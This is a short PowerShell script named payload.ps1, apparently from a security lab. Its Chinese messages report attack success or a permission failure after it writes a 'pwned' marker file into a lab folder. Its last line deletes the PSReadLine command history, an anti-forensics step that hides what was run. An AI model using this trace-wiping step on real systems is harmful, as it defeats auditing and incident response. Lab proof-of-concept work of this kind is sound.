# GitHub 內容：payload.ps1
$targetPath = "C:\Lab\ProtectedDemo\pwned.txt"

try {
    # 建立檔案並寫入一點內容
    "Pwned by PowerShell Lab" | Out-File -FilePath $targetPath -Encoding utf8 -Force
    
    Write-Host "`n------------------------------------------" -ForegroundColor Green
    Write-Host "[+] 攻擊成功！檔案已建立。" -ForegroundColor Green
    Write-Host "[+] 位置: $targetPath" -ForegroundColor Cyan
    Write-Host "------------------------------------------"
} catch {
    Write-Host "`n[!] 寫入失敗：權限不足。" -ForegroundColor Red
}

# 清除當前 Session 的 PSReadline 紀錄
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue